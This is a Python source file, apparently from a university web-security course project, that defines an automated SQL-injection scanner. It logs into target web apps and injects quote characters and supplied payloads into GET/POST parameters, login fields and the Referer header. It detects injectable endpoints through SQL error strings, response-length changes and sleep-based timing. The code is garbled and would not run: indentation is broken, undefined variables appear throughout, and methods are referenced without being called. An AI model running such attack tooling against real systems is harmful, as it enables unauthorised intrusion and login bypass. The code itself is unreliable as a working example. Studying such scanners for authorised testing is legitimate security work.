import json
import sys
import copy
import time
import urllib
import requests

class Injection:
	def __init__(self, phase2_payload, login_info, injection_info):
	"""Injection has three inputs: 
	phase2_payload from phase 2
	"login_info"("loginurl") from info.json(config.json)
	"urls" from app_user.json(for example app4_admin.json)
	"""
		self.payloadStore = {}
		self.app_user=sys.argv[1:][0]
		self.finalOutput = []
		self.login_info = login_info
		self.payloads = phase2_payload
		self.login = login
		for url in login_info:
			if url["name"] == app_user:
				loginurl = url["loginurl"]
				loginPayload = url["loginpayload"]
				if(loginurl not in payloadStore):
					payloadStore[loginurl] = loginPayload
				else:
					continue

		checkUrls = data["urls"]
		vulnerableUrl = {}
						
	def Check_Type(self):
	"""Match injection_type with respective function"""
		for urls in data["urls"]:	
			url = urls["url"]
			if (url in payloadStore) and (urls["type"] =="POST") and urls["param"]:	
				checkUrls.remove(urls)
				parameters = payloadStore[url]
				initLoad = copy.deepcopy(urls["param"])
				for param in parameters:
					initLoad[param] = [parameters[param]]
				initial_payload = copy.deepcopy(initLoad)
				loginStatus = checkLogin(initial_payload, url, defaultHeader)
				if loginStatus:
					for param in initial_payload:
						for payload in payloads:
							new_payload = copy.deepcopy(initial_payload)
							if param in payloadStore[url]:
								new_payload[param][0] = new_payload[param][0] + payload
								loginStatus = checkLogin(new_payload, url, defaultHeader)
								if loginStatus:
									origUrl = copy.deepcopy(urls)
									origUrl["param"] = new_payload
									finalOutput.append(origUrl)					
									break
					payloadStore[url] = initial_payload		
		data["urls"] = copy.deepcopy(checkUrls)
		
		for urls in data["urls"]:	
			url = urls["url"]		
			if (urls["type"] == "GET") and (urls["loginrequired"] == "true"):
				self.get_true
			elif (urls["type"] == "GET") and (urls["loginrequired"] == "false"):
				self.get_false
			elif (urls["type"] == "POST") and (urls["loginrequired"] == "true"):
				self.post_true
			elif (urls["type"] == "POST") and (urls["loginrequired"] == "false"):
				self.post_false
		
		
	def get_true(self):
	"""--method(GET) and requirelogin(true)--"""
		if(urls["type"]=="GET") and (urls["loginrequired"] == "true") and (url not in payloadStore):
			checkUrls.remove(urls)
			initHeader = defaultHeader
			loginurl = urls["loginurl"]
			if loginurl in payloadStore:
				credential = payloadStore[loginurl]
				loginpayload = credential					
				with requests.Session() as s:
					p = s.post(loginurl, data=loginpayload, verify=False)
					if p.status_code == 200:
						initLoad = copy.deepcopy(urls["param"])
						start = time.time()
						origRequest = s.get(url,params=initLoad, headers=initHeader, verify = False)
						origContent = origRequest.content
						origTrip = time.time() - start
						origLength = len(origRequest.content)
						origStatus = origRequest.status_code
						origReqUrl = origRequest.url
						gotUrl = gotUrls(origRequest.url)
						for param in initLoad:
							if gotUrl in vulnerableUrl:
								paramList = vulnerableUrl[gotUrl]
								if param in paramList:
									continue
							load = copy.deepcopy(initLoad)
							if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
								load[param] =  ["'"]
							else:
								load[param][0] =  load[param][0]+"'"
							newurl = url+"?"
							for l in load:
								newurl = newurl+l+"="+load[l][0]+"&"
							newurl = newurl[0:-1]							
							attemptedRequest = s.get(newurl, headers=initHeader, verify = False)
						
							if ("syntax error" in attemptedRequest.content.lower()) or ("error in your SQL syntax" in attemptedRequest.content):
								if gotUrl in vulnerableUrl:
									paramList = vulnerableUrl[gotUrl]
									if param not in paramList:
										paramList.append(param)
								else:
									paramList = [param]
									vulnerableUrl[gotUrl] = paramList
									origUrl = copy.deepcopy(urls)
									origUrl["param"] = load
									origUrl["loginpayload"] = loginpayload
									origUrl["newurl"] = newurl
									finalOutput.append(origUrl)		
								continue

							for payload in payloads:
								if gotUrl in vulnerableUrl:
									paramList = vulnerableUrl[gotUrl]
									if param in paramList:
										continue

								if payload.endswith('#'):
									continue

								isSleepCommand = False
								if "sleep" in payload:
									isSleepCommand = True

								load = copy.deepcopy(initLoad)
								if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
									load[param] =  [payload]
								else:
									load[param][0] =  load[param][0]+payload
								newurl = url+"?"
								for l in load:
									newurl = newurl+l+"="+load[l][0]+"&"
								newurl = newurl[0:-1]
								start = time.time()
								r = s.get(newurl, headers=initHeader, verify = False)
								newContent = r.content
								trip = time.time() - start
								length = len(r.content)
								status = r.status_code
								newReqUrl = r.url

								if ("syntax error" in r.content.lower()) or ("error in your SQL syntax" in r.content):
									gotUrl = gotUrls(origRequest.url)
									if gotUrl in vulnerableUrl:
										paramList = vulnerableUrl[gotUrl]
										if param not in paramList:
											paramList.append(param)
									else:
										paramList = [param]
										vulnerableUrl[gotUrl] = paramList
										origUrl = copy.deepcopy(urls)
										origUrl["param"] = load
										origUrl["loginpayload"] = loginpayload
										origUrl["newurl"] = newurl
										finalOutput.append(origUrl)
									continue		

								if (len(r.content) > len(origRequest.content) + 20):
									origUrl = copy.deepcopy(urls)
									origUrl["param"] = load
									origUrl["loginpayload"] = loginpayload
									origUrl["newurl"] = newurl
									finalOutput.append(origUrl)
									continue

						hackHeader = copy.deepcopy(initHeader)
						hackHeader["referer"] = "Hacked Header"
						newlyRequest = s.get(url,params = initLoad, headers=hackHeader, verify = False)
						hackContentLength = len(newlyRequest.content)
						if abs(hackContentLength-origLength)>20:
							for payload in payloads:
								hackHeader = copy.deepcopy(initHeader)
								hackHeader["referer"] = payload
								newlyRequest = s.get(url,params = initLoad, headers=hackHeader, verify = False)
								hackContentLength = len(newlyRequest.content)
								if hackContentLength == origLength:
									origUrl = copy.deepcopy(urls)
									origUrl["param"] = load
									origUrl["loginpayload"] = loginpayload
									origUrl["newurl"] = newurl
									origUrl["headers"] = hackHeader
									finalOutput.append(origUrl)									
									break
		data["urls"] = copy.deepcopy(checkUrls)
	 
	def get_false(self):
	"""--method(GET) and requirelogin(false)--"""
		if (urls["type"]=="GET") and (urls["loginrequired"] == "false") and (url not in payloadStore):
			checkUrls.remove(urls)	
			initLoad = copy.deepcopy(urls["param"])	
			initHeader = defaultHeader		
			initLoad = copy.deepcopy(urls["param"])							
			start = time.time()
			origRequest = requests.get(url, params=initLoad, headers=initHeader, verify=False)
			origContent = origRequest.content
			origTrip = time.time() - start
			origLength = len(origRequest.content)
			origStatus = origRequest.status_code
			origReqUrl = origRequest.url
			gotUrl = gotUrls(origReqUrl)
			for param in initLoad:	
				if gotUrl in vulnerableUrl:
					paramList = vulnerableUrl[gotUrl]
					if param in paramList:
						continue
				load = copy.deepcopy(initLoad)
				if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
					load[param] =  ["'"]
				else:
					load[param][0] =  load[param][0]+"'"
				newurl = url+"?"
				for l in load:
					newurl = newurl+l+"="+load[l][0]+"&"
				newurl = newurl[0:-1]							
				attemptedRequest = requests.get(newurl, headers=initHeader, verify = False)
				if ("syntax error" in attemptedRequest.content.lower()) or ("error in your SQL syntax" in attemptedRequest.content):
					if gotUrl in vulnerableUrl:
						paramList = vulnerableUrl[gotUrl]
						if param not in paramList:
							paramList.append(param)
					else:
						paramList = [param]
						vulnerableUrl[gotUrl] = paramList
						origUrl = copy.deepcopy(urls)
						origUrl["param"] = load
						origUrl["newurl"] = newurl
						finalOutput.append(origUrl)		
					continue

				for payload in payloads:
					if gotUrl in vulnerableUrl:
						paramList = vulnerableUrl[gotUrl]
						if param in paramList:
							continue
					if payload.endswith('#'):
						continue
					isSleepCommand = False
					if "sleep" in payload:
						isSleepCommand = True
					load = copy.deepcopy(initLoad)
					if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
						load[param] =  [payload]
					else:
						load[param][0] =  load[param][0]+payload
					newurl = url+"?"
					for l in load:
						newurl = newurl+l+"="+load[l][0]+"&"
					newurl = newurl[0:-1]
					start = time.time()
					r = requests.get(newurl, headers=initHeader, verify = False)
					newContent = r.content
					trip = time.time() - start
					if ("syntax error" in r.content.lower()) or ("error in your SQL syntax" in r.content):
						gotUrl = gotUrls(origRequest.url)
						if gotUrl in vulnerableUrl:
							paramList = vulnerableUrl[gotUrl]
							if param not in paramList:
								paramList.append(param)
						else:
							paramList = [param]
							vulnerableUrl[gotUrl] = paramList
							origUrl = copy.deepcopy(urls)
							origUrl["param"] = load
							origUrl["newurl"] = newurl
							finalOutput.append(origUrl)					
						continue
					if (len(r.content) > len(origRequest.content) + 20):
						origUrl = copy.deepcopy(urls)
						origUrl["param"] = load
						origUrl["newurl"] = newurl
						finalOutput.append(origUrl)		
						continue

			hackHeader = copy.deepcopy(initHeader)
			hackHeader["referer"] = "Hacked Header"
			newlyRequest = requests.get(url,params = initLoad, headers=hackHeader, verify = False)
			hackContentLength = len(newlyRequest.content)
			if abs(hackContentLength-origLength)>20:
				for payload in payloads:
					hackHeader = copy.deepcopy(initHeader)
					hackHeader["referer"] = payload
					newlyRequest = requests.get(url,params = initLoad, headers=hackHeader, verify = False)
					hackContentLength = len(newlyRequest.content)
					if hackContentLength == origLength:
						origUrl = copy.deepcopy(urls)
						origUrl["param"] = load
						origUrl["newurl"] = newurl
						origUrl["headers"] = hackHeader
						finalOutput.append(origUrl)	
						break	
		data["urls"] = copy.deepcopy(checkUrls)
	 
	def post_true(self):
	"""--method(POST) and requirelogin(true)--"""
		initHeader = defaultHeader
		if(urls["type"]=="POST") and (urls["loginrequired"] == "true") and (url not in payloadStore):
				checkUrls.remove(urls)
				loginurl = urls["loginurl"]
				if loginurl in payloadStore:
					credential = payloadStore[loginurl]
					loginpayload = credential					
					with requests.Session() as s:
						print loginpayload
						p = s.post(loginurl, data=loginpayload, verify=False)
						if p.status_code == 200:
							initLoad = copy.deepcopy(urls["param"])	
							for param in initLoad:
								if (not initLoad[param]) | (initLoad[param][0] is None) | (initLoad[param][0] == "") | (initLoad[param][0] == "None"):
									initLoad[param] =  ["CS5331"]
							start = time.time()
							origRequest = s.post(url,data = initLoad, headers=defaultHeader, verify = False)
							origContent = origRequest.content
							origTrip = time.time() - start					
							origLength = len(origRequest.content)
							origStatus = origRequest.status_code
							origReqUrl = origRequest.url
							gotUrl = gotUrls(origRequest.url)
							for param in initLoad:			
								if gotUrl in vulnerableUrl:
									paramList = vulnerableUrl[gotUrl]
									if param in paramList:
										continue			
								load = copy.deepcopy(initLoad)				
								if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
									load[param] =  ["'"]
								else:
									load[param][0] = load[param][0]+"'"					
								attemptedRequest = s.post(url,data = load, headers=defaultHeader, verify = False)
								if ("syntax error" in attemptedRequest.content.lower()) or ("error in your SQL syntax" in attemptedRequest.content):
									gotUrl = gotUrls(origRequest.url)
									if gotUrl in vulnerableUrl:
										paramList = vulnerableUrl[gotUrl]
										if param not in paramList:
											paramList.append(param)
									else:
										paramList = [param]
										vulnerableUrl[gotUrl] = paramList
										origUrl = copy.deepcopy(urls)
										origUrl["param"] = load
										origUrl["loginpayload"] = loginpayload
										finalOutput.append(origUrl)	
									continue

								for payload in payloads:
									if gotUrl in vulnerableUrl:
										paramList = vulnerableUrl[gotUrl]
										if param in paramList:
											continue

									isSleepCommand = False
									if "sleep" in payload:
										isSleepCommand = True
									load = copy.deepcopy(initLoad)
									if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
										load[param] =  [payload]
									else:
										load[param][0] =  payload
									start = time.time()
									r = s.post(url,data = load, headers=defaultHeader, verify = False)
									if ("syntax error" in r.content.lower()) or ("error in your SQL syntax" in r.content):
										gotUrl = gotUrls(origRequest.url)
										if gotUrl in vulnerableUrl:
											paramList = vulnerableUrl[gotUrl]
											if param not in paramList:
												paramList.append(param)
										else:
											paramList = [param]
											vulnerableUrl[gotUrl] = paramList
											origUrl = copy.deepcopy(urls)
											origUrl["param"] = load
											origUrl["loginpayload"] = loginpayload
											origUrl["newurl"] = newurl
											finalOutput.append(origUrl)
										continue	
									newContent = r.content
									trip = time.time() - start
									length = len(r.content)
									if (len(r.content) > len(origRequest.content) + 20) or (isSleepCommand and (trip-origTrip)>5):
										if gotUrl in vulnerableUrl:
											paramList = vulnerableUrl[gotUrl]
											if param not in paramList:
												paramList.append(param)
										else:
											paramList = [param]
											vulnerableUrl[gotUrl] = paramList
											origUrl = copy.deepcopy(urls)
											origUrl["param"] = load
											origUrl["loginpayload"] = loginpayload
											finalOutput.append(origUrl)
										continue
							hackHeader = copy.deepcopy(defaultHeader)
							hackHeader["referer"] = "Hacked Header"
							newlyRequest = s.post(url, data=initLoad, headers=hackHeader, verify=False)
							hackContentLength = len(newlyRequest.content)
							if abs(hackContentLength-origLength)>20:
								for payload in payloads:
									hackHeader = copy.deepcopy(initHeader)
									hackHeader["referer"] = payload
									newlyRequest = s.post(url, data=initLoad, headers=hackHeader, verify=False)
									hackContentLength = len(newlyRequest.content)
									if hackContentLength == origLength:
										if gotUrl in vulnerableUrl:
											paramList = vulnerableUrl[gotUrl]
											if param not in paramList:
												paramList.append(param)
										else:
											paramList = [param]
											vulnerableUrl[gotUrl] = paramList
											origUrl = copy.deepcopy(urls)
											origUrl["param"] = load
											origUrl["loginpayload"] = loginpayload
											origUrl["headers"] = hackHeader
											finalOutput.append(origUrl)
										break
		data["urls"] = copy.deepcopy(checkUrls)					
		
	def post_false(self):
	"""--method(POST) and requirelogin(false)--"""
		initHeader = defaultHeader
		if(urls["type"]=="POST") and (urls["loginrequired"] == "false") and (url not in payloadStore):
				checkUrls.remove(urls)			
				initLoad = copy.deepcopy(urls["param"])	
				for param in initLoad:
					if (not initLoad[param]) | (initLoad[param][0] is None) | (initLoad[param][0] == "") | (initLoad[param][0] == "None"):
						initLoad[param] =  ["CS5331"]						
				start = time.time()
				origRequest = requests.post(url, params=initLoad, headers=defaultHeader, verify=False)
				origContent = origRequest.content
				origTrip = time.time() - start
				origLength = len(origRequest.content)
				origStatus = origRequest.status_code
				origReqUrl = origRequest.url
				gotUrl = gotUrls(origRequest.url)
				for param in initLoad:
					if gotUrl in vulnerableUrl:
						paramList = vulnerableUrl[gotUrl]
						if param in paramList:
							continue
					load = copy.deepcopy(initLoad)				
					if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
						load[param] =  ["'"]
					else:
						load[param][0] = load[param][0]+"'"
					attemptedRequest = requests.post(url, data=load, headers=defaultHeader, verify=False)
					if ("syntax error" in attemptedRequest.content.lower()) or ("error in your SQL syntax" in attemptedRequest.content):
						gotUrl = gotUrls(origRequest.url)
						if gotUrl in vulnerableUrl:
							paramList = vulnerableUrl[gotUrl]
							if param not in paramList:
								paramList.append(param)
						else:
							paramList = [param]
							vulnerableUrl[gotUrl] = paramList
							origUrl = copy.deepcopy(urls)
							origUrl["param"] = load
							finalOutput.append(origUrl)		
						continue

					for payload in payloads:
						if gotUrl in vulnerableUrl:
							paramList = vulnerableUrl[gotUrl]
							if param in paramList:
								continue
						isSleepCommand = False
						if "sleep" in payload:
							isSleepCommand = True
						load = copy.deepcopy(initLoad)
						if (not load[param]) or (load[param][0] is None) or (load[param][0] == "None"):
							load[param] =  [payload]
						else:
							load[param][0] = payload
						start = time.time()
						r = requests.post(url, data=load, headers=defaultHeader, verify=False)
						newContent = r.content
						trip = time.time() - start
						if ("syntax error" in r.content.lower()) or ("error in your SQL syntax" in r.content):
							gotUrl = gotUrls(origRequest.url)
							if gotUrl in vulnerableUrl:
								paramList = vulnerableUrl[gotUrl]
								if param not in paramList:
									paramList.append(param)
							else:
								paramList = [param]
								vulnerableUrl[gotUrl] = paramList
								origUrl = copy.deepcopy(urls)
								origUrl["param"] = load
								origUrl["newurl"] = newurl
								finalOutput.append(origUrl)					
							continue	
						length = len(r.content)
						if (len(r.content) > len(origRequest.content) + 20) or (isSleepCommand and (trip-origTrip)>5):
							if gotUrl in vulnerableUrl:
								paramList = vulnerableUrl[gotUrl]
								if param not in paramList:
									paramList.append(param)
							else:
								paramList = [param]
								vulnerableUrl[gotUrl] = paramList
								origUrl = copy.deepcopy(urls)
								origUrl["param"] = load
								finalOutput.append(origUrl)
							continue

				hackHeader = copy.deepcopy(defaultHeader)
				hackHeader["referer"] = "Hacked Header"
				newlyRequest = requests.post(url, data=initLoad, headers=hackHeader, verify=False)
				hackContentLength = len(newlyRequest.content)
				if abs(hackContentLength-origLength)>20:
					for payload in payloads:
						hackHeader = copy.deepcopy(initHeader)
						hackHeader["referer"] = payload
						newlyRequest = requests.post(url, data=initLoad, headers=hackHeader, verify=False)
						hackContentLength = len(newlyRequest.content)
						if hackContentLength == origLength:
							if gotUrl in vulnerableUrl:
								paramList = vulnerableUrl[gotUrl]
								if param not in paramList:
									paramList.append(param)
							else:
								paramList = [param]
								vulnerableUrl[gotUrl] = paramList
								origUrl = copy.deepcopy(urls)
								origUrl["param"] = load
								origUrl["headers"] = hackHeader
								finalOutput.append(origUrl)
							break
		data["urls"] = copy.deepcopy(checkUrls)
		
	def gotUrls(url):
		if "?" in url:
			index = int(url.find("?"))
			return url[0:index]
		else:
			return url

	def checkLogin(payload, loginurl, header):
		request = requests.post(loginurl, data=payload, headers=header, verify=False)
		content = request.content.lower().replace(" ", "")
		if ("logout" in content) and (request.status_code == 200):
			return True
		if ("session expired" in content):
			return False
		for param in payload:
			if ("name='"+str(param)+"'" in content) or ('name="'+str(param)+'"' in content):
				return False
		return True
